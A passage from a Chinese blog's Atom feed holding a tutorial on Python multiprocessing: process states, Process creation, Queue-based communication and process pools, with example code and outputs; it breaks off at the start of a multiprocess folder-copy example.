      <category term="requests" scheme="https://yongnights.github.io/tags/requests/"/>
    
  </entry>
  
  <entry>
    <title>多任务_进程</title>
    <link href="https://yongnights.github.io/2019/12/31/%E5%A4%9A%E4%BB%BB%E5%8A%A1_%E8%BF%9B%E7%A8%8B/"/>
    <id>https://yongnights.github.io/2019/12/31/多任务_进程/</id>
    <published>2019-12-31T04:00:48.283Z</published>
    <updated>2019-12-31T04:00:48.283Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><h1 id="进程以及状态"><a href="#进程以及状态" class="headerlink" title="进程以及状态"></a>进程以及状态</h1><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>程序：例如xxx.py这是程序，是一个静态的<br>进程：一个程序运行起来后，代码+用到的资源 称之为进程，它是操作系统分配资源的基本单元。<br>不仅可以通过线程完成多任务，进程也是可以的</p><h2 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h2><p>工作中，任务数往往大于cpu的核数，即一定有一些任务正在执行，而另外一些任务在等待cpu进行执行，因此导致了有了不同的状态<br><img src="/images_jincheng/001.png" alt></p><a id="more"></a><ul><li>就绪态：运行的条件都已经慢去，正在等在cpu执行</li><li>执行态：cpu正在执行其功能</li><li>等待态：等待某些条件满足，例如一个程序sleep了，此时就处于等待态</li></ul><h1 id="进程的创建-multiprocessing"><a href="#进程的创建-multiprocessing" class="headerlink" title="进程的创建-multiprocessing"></a>进程的创建-multiprocessing</h1><p>multiprocessing模块就是跨平台版本的多进程模块，提供了一个Process类来代表一个进程对象，这个对象可以理解为是一个独立的进程，可以执行另外的事情</p><h2 id="2个while循环一起执行"><a href="#2个while循环一起执行" class="headerlink" title="2个while循环一起执行"></a>2个while循环一起执行</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""子进程要执行的代码"""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"----2----"</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    p = Process(target=run_proc)</span><br><span class="line">    p.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"----1----"</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>说明</p><ul><li>创建子进程时，只需要传入一个执行函数和函数的参数，创建一个Process实例，用start()方法启动</li></ul><h2 id="进程pid"><a href="#进程pid" class="headerlink" title="进程pid"></a>进程pid</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""子进程要执行的代码"""</span></span><br><span class="line">    print(<span class="string">'子进程运行中，pid=%d...'</span> % os.getpid())  <span class="comment"># os.getpid获取当前进程的进程号</span></span><br><span class="line">    print(<span class="string">'子进程将要结束...'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'父进程pid: %d'</span> % os.getpid())  <span class="comment"># os.getpid获取当前进程的进程号</span></span><br><span class="line">    p = Process(target=run_proc)</span><br><span class="line">    p.start()</span><br></pre></td></tr></table></figure><h2 id="Process语法结构"><a href="#Process语法结构" class="headerlink" title="Process语法结构"></a>Process语法结构</h2><p>Process([group [, target [, name [, args [, kwargs]]]]])</p><ul><li>target：如果传递了函数的引用，可以任务这个子进程就执行这里的代码</li><li>args：给target指定的函数传递的参数，以元组的方式传递</li><li>kwargs：给target指定的函数传递命名参数</li><li>name：给进程设定一个名字，可以不设定</li><li>group：指定进程组，大多数情况下用不到</li></ul><p>Process创建的实例对象的常用方法：</p><ul><li>start()：启动子进程实例（创建子进程）</li><li>is_alive()：判断进程子进程是否还在活着</li><li>join([timeout])：是否等待子进程执行结束，或等待多少秒</li><li>terminate()：不管任务是否完成，立即终止子进程</li></ul><p>Process创建的实例对象的常用属性：</p><ul><li>name：当前进程的别名，默认为Process-N，N为从1开始递增的整数</li><li>pid：当前进程的pid（进程号）</li></ul><h2 id="给子进程指定的函数传递参数"><a href="#给子进程指定的函数传递参数" class="headerlink" title="给子进程指定的函数传递参数"></a>给子进程指定的函数传递参数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">(name, age, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        print(<span class="string">'子进程运行中，name= %s,age=%d ,pid=%d...'</span> % (name, age, os.getpid()))</span><br><span class="line">        print(kwargs)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    p = Process(target=run_proc, args=(<span class="string">'test'</span>,<span class="number">18</span>), kwargs=&#123;<span class="string">"m"</span>:<span class="number">20</span>&#125;)</span><br><span class="line">    p.start()</span><br><span class="line">    sleep(<span class="number">1</span>)  <span class="comment"># 1秒中之后，立即结束子进程</span></span><br><span class="line">    p.terminate()</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure><h2 id="进程间不共享全局变量"><a href="#进程间不共享全局变量" class="headerlink" title="进程间不共享全局变量"></a>进程间不共享全局变量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""子进程要执行的代码"""</span></span><br><span class="line">    print(<span class="string">"in process1 pid=%d ,nums=%s"</span> % (os.getpid(), nums))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        nums.append(i)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">"in process1 pid=%d ,nums=%s"</span> % (os.getpid(), nums))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""子进程要执行的代码"""</span></span><br><span class="line">    print(<span class="string">"in process2 pid=%d ,nums=%s"</span> % (os.getpid(), nums))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p1 = Process(target=work1)</span><br><span class="line">    p1.start()</span><br><span class="line">    p1.join()</span><br><span class="line"></span><br><span class="line">    p2 = Process(target=work2)</span><br><span class="line">    p2.start()</span><br></pre></td></tr></table></figure><p>运行结果:<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">in</span> process1 pid=11349 ,nums=[11, 22]</span><br><span class="line"><span class="keyword">in</span> process1 pid=11349 ,nums=[11, 22, 0]</span><br><span class="line"><span class="keyword">in</span> process1 pid=11349 ,nums=[11, 22, 0, 1]</span><br><span class="line"><span class="keyword">in</span> process1 pid=11349 ,nums=[11, 22, 0, 1, 2]</span><br><span class="line"><span class="keyword">in</span> process2 pid=11350 ,nums=[11, 22]</span><br></pre></td></tr></table></figure><p></p><h1 id="进程、线程对比"><a href="#进程、线程对比" class="headerlink" title="进程、线程对比"></a>进程、线程对比</h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>进程，能够完成多任务，比如 在一台电脑上能够同时运行多个QQ</li><li>线程，能够完成多任务，比如 一个QQ中的多个聊天窗口</li></ul><h2 id="定义的不同"><a href="#定义的不同" class="headerlink" title="定义的不同"></a>定义的不同</h2><ul><li>进程是系统进行资源分配和调度的一个独立单位.</li><li>线程是进程的一个实体,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位.线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源(如程序计数器,一组寄存器和栈),但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源.</li></ul><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><ul><li>一个程序至少有一个进程,一个进程至少有一个线程.</li><li>线程的划分尺度小于进程(资源比进程少)，使得多线程程序的并发性高。</li><li><p>进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率<br>![]/images_jincheng/002.png)</p></li><li><p>线程不能够独立执行，必须依存在进程中</p></li><li>可以将进程理解为工厂中的一条流水线，而其中的线程就是这个流水线上的工人</li></ul><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>线程和进程在使用上各有优缺点：线程执行开销小，但不利于资源的管理和保护；而进程正相反。</p><h1 id="进程间通信-Queue"><a href="#进程间通信-Queue" class="headerlink" title="进程间通信-Queue"></a>进程间通信-Queue</h1><p>Process之间有时需要通信，操作系统提供了很多机制来实现进程间的通信。</p><h2 id="Queue的使用"><a href="#Queue的使用" class="headerlink" title="Queue的使用"></a>Queue的使用</h2><p>可以使用multiprocessing模块的Queue实现多进程之间的数据传递，Queue本身是一个消息列队程序，首先用一个小实例来演示一下Queue的工作原理：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue</span><br><span class="line">q=Queue(<span class="number">3</span>) <span class="comment">#初始化一个Queue对象，最多可接收三条put消息</span></span><br><span class="line">q.put(<span class="string">"消息1"</span>) </span><br><span class="line">q.put(<span class="string">"消息2"</span>)</span><br><span class="line">print(q.full())  <span class="comment">#False</span></span><br><span class="line">q.put(<span class="string">"消息3"</span>)</span><br><span class="line">print(q.full()) <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为消息列队已满下面的try都会抛出异常，第一个try会等待2秒后再抛出异常，第二个Try会立刻抛出异常</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q.put(<span class="string">"消息4"</span>,<span class="literal">True</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"消息列队已满，现有消息数量:%s"</span>%q.qsize())</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q.put_nowait(<span class="string">"消息4"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"消息列队已满，现有消息数量:%s"</span>%q.qsize())</span><br><span class="line"></span><br><span class="line"><span class="comment">#推荐的方式，先判断消息列队是否已满，再写入</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> q.full():</span><br><span class="line">    q.put_nowait(<span class="string">"消息4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取消息时，先判断消息列队是否为空，再读取</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(q.qsize()):</span><br><span class="line">        print(q.get_nowait())</span><br></pre></td></tr></table></figure><p></p><p>运行结果:<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">False</span><br><span class="line">True</span><br><span class="line">消息列队已满，现有消息数量:3</span><br><span class="line">消息列队已满，现有消息数量:3</span><br><span class="line">消息1</span><br><span class="line">消息2</span><br><span class="line">消息3</span><br></pre></td></tr></table></figure><p></p><p>说明<br>初始化Queue()对象时（例如：q=Queue()），若括号中没有指定最大可接收的消息数量，或数量为负值，那么就代表可接受的消息数量没有上限（直到内存的尽头）；</p><ul><li>Queue.qsize()：返回当前队列包含的消息数量；</li><li>Queue.empty()：如果队列为空，返回True，反之False ；</li><li>Queue.full()：如果队列满了，返回True,反之False；</li><li>Queue.get([block[, timeout]])：获取队列中的一条消息，然后将其从列队中移除，block默认值为True；</li></ul><p>1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果为空，此时程序将被阻塞（停在读取状态），直到从消息列队读到消息为止，如果设置了timeout，则会等待timeout秒，若还没读取到任何消息，则抛出”Queue.Empty”异常；<br>2）如果block值为False，消息列队如果为空，则会立刻抛出”Queue.Empty”异常；</p><ul><li>Queue.get_nowait()：相当Queue.get(False)；</li><li>Queue.put(item,[block[, timeout]])：将item消息写入队列，block默认值为True；</li></ul><p>1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果已经没有空间可写入，此时程序将被阻塞（停在写入状态），直到从消息列队腾出空间为止，如果设置了timeout，则会等待timeout秒，若还没空间，则抛出”Queue.Full”异常；<br>2）如果block值为False，消息列队如果没有空间可写入，则会立刻抛出”Queue.Full”异常；</p><ul><li>Queue.put_nowait(item)：相当Queue.put(item, False)；</li></ul><h2 id="Queue实例"><a href="#Queue实例" class="headerlink" title="Queue实例"></a>Queue实例</h2><p>我们以Queue为例，在父进程中创建两个子进程，一个往Queue里写数据，一个从Queue里读数据：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写数据进程执行的代码:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>]:</span><br><span class="line">        print(<span class="string">'Put %s to queue...'</span> % value)</span><br><span class="line">        q.put(value)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读数据进程执行的代码:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">            value = q.get(<span class="literal">True</span>)</span><br><span class="line">            print(<span class="string">'Get %s from queue.'</span> % value)</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 父进程创建Queue，并传给各个子进程：</span></span><br><span class="line">    q = Queue()</span><br><span class="line">    pw = Process(target=write, args=(q,))</span><br><span class="line">    pr = Process(target=read, args=(q,))</span><br><span class="line">    <span class="comment"># 启动子进程pw，写入:</span></span><br><span class="line">    pw.start()    </span><br><span class="line">    <span class="comment"># 等待pw结束:</span></span><br><span class="line">    pw.join()</span><br><span class="line">    <span class="comment"># 启动子进程pr，读取:</span></span><br><span class="line">    pr.start()</span><br><span class="line">    pr.join()</span><br><span class="line">    <span class="comment"># pr进程里是死循环，无法等待其结束，只能强行终止:</span></span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">'所有数据都写入并且读完'</span>)</span><br></pre></td></tr></table></figure><p></p><h1 id="进程池Pool"><a href="#进程池Pool" class="headerlink" title="进程池Pool"></a>进程池Pool</h1><p>当需要创建的子进程数量不多时，可以直接利用multiprocessing中的Process动态成生多个进程，但如果是上百甚至上千个目标，手动的去创建进程的工作量巨大，此时就可以用到multiprocessing模块提供的Pool方法。</p><p>初始化Pool时，可以指定一个最大进程数，当有新的请求提交到Pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到指定的最大值，那么该请求就会等待，直到池中有进程结束，才会用之前的进程来执行新的任务，请看下面的实例：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span><span class="params">(msg)</span>:</span></span><br><span class="line">    t_start = time.time()</span><br><span class="line">    print(<span class="string">"%s开始执行,进程号为%d"</span> % (msg,os.getpid()))</span><br><span class="line">    <span class="comment"># random.random()随机生成0~1之间的浮点数</span></span><br><span class="line">    time.sleep(random.random()*<span class="number">2</span>) </span><br><span class="line">    t_stop = time.time()</span><br><span class="line">    print(msg,<span class="string">"执行完毕，耗时%0.2f"</span> % (t_stop-t_start))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    po = Pool(<span class="number">3</span>)  <span class="comment"># 定义一个进程池，最大进程数3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="comment"># Pool().apply_async(要调用的目标,(传递给目标的参数元祖,))</span></span><br><span class="line">        <span class="comment"># 每次循环将会用空闲出来的子进程去调用目标</span></span><br><span class="line">        po.apply_async(worker, (i,))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"----start----"</span>)</span><br><span class="line">    po.close()  <span class="comment"># 关闭进程池，关闭后po不再接收新的请求</span></span><br><span class="line">    po.join()  <span class="comment"># 等待po中所有子进程执行完成，必须放在close语句之后</span></span><br><span class="line">    print(<span class="string">"-----end-----"</span>)</span><br></pre></td></tr></table></figure><p></p><p>运行结果:<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">----start----</span><br><span class="line">0开始执行,进程号为21466</span><br><span class="line">1开始执行,进程号为21468</span><br><span class="line">2开始执行,进程号为21467</span><br><span class="line">0 执行完毕，耗时1.01</span><br><span class="line">3开始执行,进程号为21466</span><br><span class="line">2 执行完毕，耗时1.24</span><br><span class="line">4开始执行,进程号为21467</span><br><span class="line">3 执行完毕，耗时0.56</span><br><span class="line">5开始执行,进程号为21466</span><br><span class="line">1 执行完毕，耗时1.68</span><br><span class="line">6开始执行,进程号为21468</span><br><span class="line">4 执行完毕，耗时0.67</span><br><span class="line">7开始执行,进程号为21467</span><br><span class="line">5 执行完毕，耗时0.83</span><br><span class="line">8开始执行,进程号为21466</span><br><span class="line">6 执行完毕，耗时0.75</span><br><span class="line">9开始执行,进程号为21468</span><br><span class="line">7 执行完毕，耗时1.03</span><br><span class="line">8 执行完毕，耗时1.05</span><br><span class="line">9 执行完毕，耗时1.69</span><br><span class="line">-----end-----</span><br></pre></td></tr></table></figure><p></p><p>multiprocessing.Pool常用函数解析：</p><ul><li>apply_async(func[, args[, kwds]]) ：使用非阻塞方式调用func（并行执行，堵塞方式必须等待上一个进程退出才能执行下一个进程），args为传递给func的参数列表，kwds为传递给func的关键字参数列表；</li><li>close()：关闭Pool，使其不再接受新的任务；</li><li>terminate()：不管任务是否完成，立即终止；</li><li>join()：主进程阻塞，等待子进程的退出， 必须在close或terminate之后使用；</li></ul><h2 id="进程池中的Queue"><a href="#进程池中的Queue" class="headerlink" title="进程池中的Queue"></a>进程池中的Queue</h2><p>如果要使用Pool创建进程，就需要使用multiprocessing.Manager()中的Queue()，而不是multiprocessing.Queue()，否则会得到一条如下的错误信息：<br>RuntimeError: Queue objects should only be shared between processes through inheritance.<br>下面的实例演示了进程池中的进程如何通信：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改import中的Queue为Manager</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Manager,Pool</span><br><span class="line"><span class="keyword">import</span> os,time,random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reader</span><span class="params">(q)</span>:</span></span><br><span class="line">    print(<span class="string">"reader启动(%s),父进程为(%s)"</span> % (os.getpid(), os.getppid()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(q.qsize()):</span><br><span class="line">        print(<span class="string">"reader从Queue获取到消息：%s"</span> % q.get(<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writer</span><span class="params">(q)</span>:</span></span><br><span class="line">    print(<span class="string">"writer启动(%s),父进程为(%s)"</span> % (os.getpid(), os.getppid()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"itcast"</span>:</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"(%s) start"</span> % os.getpid())</span><br><span class="line">    q = Manager().Queue()  <span class="comment"># 使用Manager中的Queue</span></span><br><span class="line">    po = Pool()</span><br><span class="line">    po.apply_async(writer, (q,))</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 先让上面的任务向Queue存入数据，然后再让下面的任务开始从中取数据</span></span><br><span class="line"></span><br><span class="line">    po.apply_async(reader, (q,))</span><br><span class="line">    po.close()</span><br><span class="line">    po.join()</span><br><span class="line">    print(<span class="string">"(%s) End"</span> % os.getpid())</span><br></pre></td></tr></table></figure><p></p><p>运行结果:<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(11095) start</span><br><span class="line">writer启动(11097),父进程为(11095)</span><br><span class="line">reader启动(11098),父进程为(11095)</span><br><span class="line">reader从Queue获取到消息：i</span><br><span class="line">reader从Queue获取到消息：t</span><br><span class="line">reader从Queue获取到消息：c</span><br><span class="line">reader从Queue获取到消息：a</span><br><span class="line">reader从Queue获取到消息：s</span><br><span class="line">reader从Queue获取到消息：t</span><br><span class="line">(11095) End</span><br></pre></td></tr></table></figure><p></p><h1 id="应用：文件夹copy器（多进程版）"><a href="#应用：文件夹copy器（多进程版）" class="headerlink" title="应用：文件夹copy器（多进程版）"></a>应用：文件夹copy器（多进程版）</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> 